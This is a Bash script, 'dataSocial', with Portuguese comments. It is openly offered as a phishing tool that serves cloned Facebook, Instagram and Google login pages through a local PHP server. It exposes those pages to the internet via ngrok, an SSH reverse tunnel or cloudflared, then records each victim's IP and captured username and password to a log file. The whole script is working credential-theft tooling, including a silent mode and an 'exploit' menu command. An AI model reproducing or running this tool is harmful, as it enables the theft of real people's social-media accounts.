#!/usr/bin/env bash
# dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
#
# Site			: https://programadorboard.epizy.com/autor
# Autor			: Oliver Silva <programadorboard@gmail.com>
# Manutênção 	: Oliver Silva <programadorboard@gmail.com>
#
# -------------------------------
# Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
#
# Exemplo:
#
# $ ./datasocial.sh --listen facebook
# 
# ~/DataSocial $ termux-chroot ./datasocial.sh --listen google
#
#                '
#              '   '  TIOOLIVER | https://t.me/tiooliver_sh
#            '       '   https://youtube.com/@tioolive - BRAZIL
#        . ' .    '    '                       '
#     '              '                      '   '
#  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
#  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄
#  .                          ..'.    ' .
#    '  .                   .     '       '
#          ' .  .  .  .  . '.    .'         '  '
#             '         '    '. '              .
#               '       '      '
#                 ' .  '   Site: https://toolmuxapp.pythonanywhere.com
#
# [!] Público: http://localhost:1492
# [+] Nova conexão aberta: 127.0.0.1
# [+] Credenciais capturadas:
#    [Usuário]   ana@example.com
#    [Senha]     jsjjssjsjwjs
# [!] Seu log está in: logs/datasocial.txt
#
# Histórico:
#
# v0.1 2022-11-28, Oliver Silva;
#     Adicionado suporte para facebook e instagram
# v0.2 2023-01-05, Oliver Silva:
#     Adicionado o comando JQ no lugar do GREP
# v0.3 2023-01-07, Oliver Silva:
#     Adicionado instalador de requisitos caso necessário
# v0.4 2023-01-08, Oliver Silva:
#     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
# v0.5 2023-03-19, Oliver Silva:
#     Adicionado suporte a repetição do ataque
# v0.6 2023-03-31, Oliver Silva:
#     Adicionado suporte ao modo interativo
# v0.7 2023-04-27, Oliver Silva:
#     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
# v0.8 2023-08-31, Oliver Silva:
#     Adicionado mais uma tela google e refatoração
# v0.9 2023-9-15, Oliver Silva:
#     Adicionado um proxy reverso localxspose
# v1.0 2023-9-16, Oliver Silva:
#     Adicionada opção de adicionar token de acesso de tunels
# v1.1 2024-5-8, Oliver Silva:
#	 Adicionado cloudflared e refatoração de código
#
# Licença: MIT License
#
# Versão 0.1: Gera páginas somente facebook e instagram
# Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
# Versão 0.3: Instalador de requisitos
# Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
# Versão 0.5: Repetição do ataque caso precise
# Versão 0.6: Modo interativo adicionado
# Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
# Versão 0.8: Página do gooogle atualizada, refatoração.
# Versão 0.9: Novo tunnel adicionado, refatoração.
# Versão 1.0: Nova opção '--add-token' adicionada para vincular contas através do token de acesso.
# Versão 1.1: Novas opçôes '--auth-key',  '--generate-ssh-key' e '--silent' para ativar o modo silêncioso, e refatoração do código
#

# Carrega variáveis e funções da configuração
source config/st.sh
source config/banner.sh
source config/help.sh
source config/version.sh

# Configurações de rede e diretórios
host="localhost"
port="1492" #"$(shuf -i 1000-9999 -n 1)"
www="www"
websites="websites"

HISTFILE=~/.datasocial_history
HISTSIZE=1000
HISTSIZEFILE=1000

# Cria o arquivo personalizado do histórico de comandos
>"$HISTFILE"

# Carrega o histórico do arquivo
history -r "$HISTFILE"

# Chaves de controle para argumentos e exibição
serviceSelectedKey=0
tunnelSelectedKey=0
silentKey=0

# Paleta de cores
red="\e[31;1m"
green="\e[32;1m"
yellow="\e[33;1m"
blue="\e[34;1m"
magenta="\e[35;1m"
cyan="\e[36;1m"
reset="\e[0m"
under="\e[4m"

trap cleanExit INT

# Encerra a execução do script de forma limpa.
# Finaliza processos em segundo plano, exibe mensagem de encerramento
# (se não estiver em modo silencioso) e sai com código 0.
cleanExit() {
	echo -e "\n\n${red}Encerrando o programa...${reset}\n"
	removeFiles
	killAllProcess
	tput cnorm
	exit 0
}

# Remove o diretório 'www' se ele existir (limpeza antes de iniciar novo serviço)
removeFiles() {
	[ -d "$www" ] && rm "$www" -rf
}

# Verifica se o diretório /etc/apt existe, indicando que o ambiente está configurado corretamente.
# Retorna 0 se o diretório existir, indicando que o ambiente é válido, e 1 caso contrário.
checkEnvironmentProot() {
	if [ ! -d /etc/apt ]; then
		return 1
	else
		return 0
	fi
}

# Copia os arquivos do site selecionado para o diretório 'www'
# Parâmetros:
#   $1 - Nome do serviço (pasta dentro de 'websites')
copyFiles() {
	local serviceSelected="$1"

	removeFiles
	
	[ ! -d "$www" ] && mkdir "$www"
	[ ! -d "logs" ] && mkdir -p logs
	[ ! -d "pids" ] && mkdir -p pids

	# Verificação extra
	if ! checkST "services" "$serviceSelected"; then
		echo -e "${red}Serviço $serviceSelected inválido.${reset}"
		exit 1
	fi
	
	cp $websites/$serviceSelected/* $www -rf
}

# Finaliza todos os processos relacionados aos túneis e servidor local (php, ngrok, ssh e cloudflared).
killAllProcess() {
	local pid_files=("php.pid" "ngrok.pid" "ssh.pid" "cloudflared.pid")

	for file in "${pid_files[@]}"; do
		local path="pids/$file"

		if [ -f "$path" ]; then
			pid=$(cat "$path")

			if kill -0 "$pid" 2>/dev/null; then
				kill "$pid" 2>/dev/null
				sleep 1
				kill -9 "$pid" 2>/dev/null
			fi
			rm -f "$path"
		fi
	done
}

# Verifica se a autenticação necessária está configurada para o túnel selecionado (ngrok ou SSH).
checkAuthAccount() {
	local tunnel="$1"

	if [ $silentKey -eq 0 ]; then
		case "$tunnel" in
			ngrok)
				# Verifica Ngrok
				if ! cat $HOME/.config/ngrok/ngrok.yml > /dev/null 2>&1; then
					echo -e "${red}[!] Configure o ngrok com a chave da sua conta antes de usá-lo.${reset}"
					exit 1
				fi
				;;

			ssh)
				# Verifica SSH
				if [ ! -f $HOME/.ssh/id_rsa ] || [ ! -f $HOME/.ssh/id_rsa.pub ] ; then
					echo -e "${red}[!] Gere uma chave SSH com 'ssh-keygen' antes de usar o tunnel SSH (localhost.run).${reset}"
					exit 1
				fi
				;;
			*)
				echo -e "${red}Túnel inválido.${reset}"
				exit 1;;
		esac
	fi
}

# Gera uma nova chave SSH RSA de 4096 bits com o e-mail fornecido como comentário.
generateSshKey() {
	local email="$1"

	ssh-keygen -t rsa -b 4096 -C $email

	exit 0
}


# Adiciona o token de autenticação à configuração do Ngrok
addNgrokToken() {
	local token="$1"

	ngrok config add-authtoken "$token"
}

# Verifica se uma chave existe em um array associativo passado por nome. Retorna 0 se existir, 1 caso contrário.
checkST() {
	local arrayName="$1"
	local key="$2"

	declare -n assoc="$arrayName"

	if [[ -n "${assoc[$key]}" ]]; then
		return  0
	else
		return 1
	fi
}

# Inicia o servidor local com PHP e exibe o link gerado se não estiver em modo silencioso.
listenServerLocalhost() {
	showBanner

	local link=
	local serviceSelected="$1"

	if ! checkEnvironmentProot; then
		echo -e "${red}[!]${reset} Ambiente Proot não detectado. Certifique-se de que o Proot está instalado e configurado corretamente."
		exit 1
	fi

	if ! checkST "services" "$serviceSelected"; then
		echo -e "${red}Serviço ${yellow}$serviceSelected ${red}inválido.${reset}"
		exit 1
	fi

	copyFiles "$serviceSelected"

	killAllProcess

	php -S "$host:$port" -t "$www" > logs/php.log 2>&1 & echo $! > pids/php.pid
	link=$(waitTunnelLink "logs/php.log" "http://[-1-9a-z:]*")
	showTunnelLink "localhost" "$link"
}

# Aguarda o link ser gerado no log especificado
# Parâmetros:
#   $1 - Caminho do arquivo de log
#   $2 - Expressão regex para extrair o link
# Retorno:
#   Echo com o link (se encontrado)
waitTunnelLink() {
	local log_file="$1"
	local regex="$2"
	local link=""

	for i in {1..15}; do
		link=$(grep -oP "$regex" "$log_file")

		if [[ -n "$link" ]]; then
			echo "$link"
			return 0
		fi
		sleep 1
	done

	echo ""
	return 1
}	

# Exibe o link público do túnel ou localhost, ou uma mensagem de erro personalizada caso o link esteja vazio.
# Parâmetros:
#   $1 - Localhost ou Nome do túnel (ngrok, ssh, cloudflared)
#   $2 - Link gerado pelo túnel
showTunnelLink() {	
	local tsSelected="$1"
	local link="$2"

	if [ $silentKey -eq 0 ]; then
		if [ -z "$link" ]; then
			case "$tsSelected" in
				"localhost")
					echo -e "${red}[x]${reset} Nenhum link localhost foi gerado. Verifique se o servidor foi iniciado corretamente.";;
				ngrok)
					echo -e "${red}[x]${reset} Link do ngrok vazio. Verifique se a chave está configurada e o serviço está disponível.";;
				ssh)
					echo -e "${red}[x]${reset} Link SSH ausente. Verifique a conexão com localhost.run.${reset}";;
				cloudflared)
					echo -e "${red}[x]${reset} Cloudflared não conseguiu gerar um endereço público.";;					
				*)
					echo -e "${red}[x]${reset}Túnel desconhecido ou o link não encontrado.";;
			esac
			
		else
			if [ "$tsSelected" == "localhost" ]; then
				echo -e "${green}[+]${reset} Local: ${yellow}$link${reset}"
			else
				echo -e "${green}[+]${reset} Público: ${yellow}$link${reset}"
			fi
		fi
	fi
}

# Inicia o servidor local e o expõe publicamente por meio do túnel selecionado (ngrok, ssh, cloudflared ou Localxpose).
# Valida o túnel, executa o comando correspondente, extrai o link público gerado e o exibe.
# Parâmetros:
#   $1 - Nome do túnel a ser utilizado
listenServerPublic() {
	local link=
	local tunnelSelected="$1"

	if ! checkST "tunnels" "$tunnelSelected"; then
		echo -e "${red}Túnel $tunnelSelected inválido.${reset}"
		exit 1
	fi

	case "$tunnelSelected" in
		ngrok)
			checkAuthAccount "ngrok"
			bin/ngrok http $port --log=stdout > logs/ngrok.log 2>&1 & echo $! > pids/ngrok.pid
			link=$(waitTunnelLink "logs/ngrok.log" "url=\Khttps://[^\s]+")
			;;
		ssh)
			checkAuthAccount "ssh"
		
			ssh -i $HOME/.ssh/id_rsa -R 80:localhost:$port ssh.localhost.run > logs/ssh.log 2>&1 & echo $! > pids/ssh.pid
			
			link=$(waitTunnelLink "logs/ssh.log" "https://[a-z0-9]+\.lhr\.life" | head -n 1)
			;;
			
		cloudflared)
			cloudflared tunnel --url http://$host:$port > logs/cloudflared.log 2>&1 & echo $! > pids/cloudflared.pid

			link=$(waitTunnelLink "logs/cloudflared.log" "https://\S*trycloudflare.com")
			;;
			
		*)
			echo -e "${red}Túnel não existe.${reset}"
			exit 1
			;;
	esac

	showTunnelLink "$tunnelSelected" "$link"
}	

# Aguarda a criação do arquivo de IP e exibe o IP da nova conexão quando detectado.
getIp() {
	local ip_file="$www/ip.txt"
	local spinner='|/-\'
	local i=0

	tput civis
	
	while [ ! -f "$ip_file" ]; do
		if [ $silentKey -eq 0 ]; then
			printf "\r\e[K${blue}[*]${reset} Escultando conexão... %c" "${spinner:i++%${#spinner}:1}"
		fi

		sleep 0.5
	done

	ip=$(awk ' {print $3} ' "$ip_file")

	if [ $silentKey -eq 0 ]; then
		printf "\r\e[K${green}[+]${reset} Nova conexão aberta: ${cyan}$ip${reset}\n"
	fi
}

# Aguarda o recebimento de dados de login, exibe as credenciais capturadas e as salva em um arquivo de log.
getData() {
	getIp

	local data_file="$www/src/dados.txt"
	local log_file="logs/datasocial.txt"
	local spinner='|/-\'
	local i=0


	while [ ! -f "$data_file" ]; do
		if [ $silentKey -eq 0 ]; then
			printf "\r\e[K${blue}[*]${reset} Aguardando credenciais... %c" "${spinner:i++%${#spinner}:1}"
		fi

		sleep 0.5
	done

	[ ! -d logs ] && mkdir logs

	cat "$data_file" > $log_file

	if [ $silentKey -eq 0 ]; then
		printf "\r\e[K${green}[+]${reset} Credenciais capturadas: \n"
	fi

	usuario=$(sed -n 's/^Usuário: //p' "$data_file")
	senha=$(sed -n 's/^Senha: //p' "$data_file")

	if [ $silentKey -eq 0 ]; then
		echo -e "    ${yellow}[Usuário]${reset}	$usuario"
		echo -e "    ${yellow}[Senha]${reset}   	$senha"

		printf "\r\e[K${blue}[+]${reset} Seu log está in: ${magenta}logs/datasocial.txt${reset}\n"
	fi

	tput cnorm

}

# Lista todas as chaves disponíveis de um array associativo passado como parâmetro.
listST() {
	local arrayName="$1"
	
	declare -n assoc="$arrayName"

	for st in "${!assoc[@]}"; do
		echo "- $st"
	done
}	

# Lista todos os serviços disponíveis.
listServices() { listST "services"; }
# Lista todos os túneis disponíveis.
listTunnels () { listST "tunnels"; }

printModuleInfo() {	
	echo -e "\n${reset}Module options (service/${selectedService:-No service}):\n"
	
	printf "  %-15s %-20s %-10s %-s\n" "Name" "Current Setting" "Required" "Description"
	printf "  %-15s %-20s %-10s %-s\n" "----" "------- -------" "--------" "-----------"

	printf "  %-15s %-20s %-10s %-s\n" "Tunnel" "${selectedTunnel:-No tunnel}" "no" "Especify the tunnel"
	printf "  %-15s %-20s %-10s %-s\n" "Port" "${selectedPort:-1492}" "yes" "Port to listen or connect"
	echo ""
}

# Menu interativo
interactiveMenu() {
	showBannerInteractive

	while true; do
		if [[ -n "$selectedService" ]]; then
			prompt="${reset}${under}dsf${reset} ${reset}service(${red}${selectedService}${reset}) > "
		else
			prompt="${reset}${under}dsf${reset} > "
		fi
	
		read -e -a cmd_parts -p "$(echo -e "$prompt")"

		cmd="${cmd_parts[0]}"
		arg="${cmd_parts[1]}"
		target="${cmd_parts[2]}"
		
		history -s "${cmd_parts[*]}" # Adiciona ao históric
		history -a 		  # Salva o histórico no arquivo
		
		[[ -z "$cmd" ]] && continue

		case "$cmd" in
			help | \?) showHelpInteractive;;
			show)
				case "$arg" in
					services) listST "services";;
					tunnels) listST "tunnels";;
					options) printModuleInfo;;
					*) echo -e "\n${reset}Commands = services - tunnels - options ?${reset}\n";;
				esac
				;;
				
			use)
				if [[ "$arg" == "service" && -n "$target" ]]; then
					if checkST "services" "$target"; then
						selectedService="$target"
					else
						echo "Serviço não encontrado."
					fi
				else
					echo "Commands = service - help ?"
				fi
				;;

			set)
				if [[ -z "$selectedService" ]]; then
					echo "Selecione um serviço antes de definir qualquer configuração."
					continue
				fi

				if [[ "$arg" == "tunnel" && -n "$target" ]]; then
					if checkST "tunnels" "$target"; then
						selectedTunnel="$target"
					else
						echo "Túnel não encontrado."
					fi
					
				elif [[ "$arg" == "silent" && -n "$target" ]]; then
					case "$target" in
						on) silentKey=1;;
						off) silentKey=0;;
						*) echo "Commands = help - ?";;
					esac
					
				else
					echo "Commands = tunnel - help ?"
				fi
				;;

			run|execute|exploit)
				if [[ -n "$selectedService" && -z "$selectedTunnel" ]]; then
					listenServerLocalhost "$selectedService" && getData
				elif [[ -n "$selectedService" && -n "$selectedTunnel" ]]; then
					listenServerLocalhost "$selectedService"
					listenServerPublic "$selectedTunnel" && getData
				else
					echo "Erro ao processar o comando."
				fi
				;;
				
			exit | quit) break;;
			
			*) echo "Commands = help - ?";;
		esac
	done
}

[ -z "$1" ] && showHelp

# Processa os argumentos fornecidos ao script e executa ações baseadas neles.
while [ -n "$1" ]; do
	case "$1" in
		-h| --help) showHelp;;
		-v| --version) showVersion;;
		
		--auth-ngrok)
			shift

			# Verifique se o token foi fornecido e grava a achave
			
			if [ -z "$1" ]; then
				echo "Precisa do token."
				exit 1
			fi
			
			token="$1"
			addNgrokToken "$token"
			;;

		--generate-ssh-key)
			shift

			# Verifica se o e-mail foi fornecido e gera a chave SSH
			if [ -z "$1" ]; then
				echo "Precisa de um e-mail válido."
				exit 1
			fi

			email="$1"
			generateSshKey "$email"
			;;
			
		--listen)
			shift	

			# Verifica se o serviço foi fornecido e seleciona o serviço para escutar
			if [ -z "$1" ]; then
				echo "Precisa de um serviço"
				exit 1
			fi

			serviceSelected="$1"
			serviceSelectedKey=1
			;;

		--tunnel)
			shift

			# Verifica se o túnel foi fornecido e seleciona o túnel
			if [ -z "$1" ] ; then
				echo "Precisa de um tunnel"
				exit 1
			fi

			tunnelSelected="$1"
			tunnelSelectedKey=1
			;;

		--services) listServices;;
		--tunnels) listTunnels;;

		--silent) silentKey=1;;
		-i|--interactive) interactiveMenu;;
		*) 
			# Caso a opção fornecida não seja válida
			echo "Opção $1 inválida!"
			exit 1;;
	esac

	shift
done

# Verifica se um serviço foi selecionado e se não foi selecionado um túnel,
# então inicializa o servidor local e captura os dados.
# Se ambos, serviço e túnel, foram selecionados, inicia tanto o servidor local quanto o público,
# e captura os dados. Caso contrário, exibe um erro.
[ $serviceSelectedKey -eq 1 -a ! $tunnelSelectedKey -eq 1 ] && {
	listenServerLocalhost "$serviceSelected"
	getData
}

[ $serviceSelectedKey -eq 1 -a $tunnelSelectedKey -eq 1 ] && {
	listenServerLocalhost "$serviceSelected"
	listenServerPublic "$tunnelSelected"
	getData
}
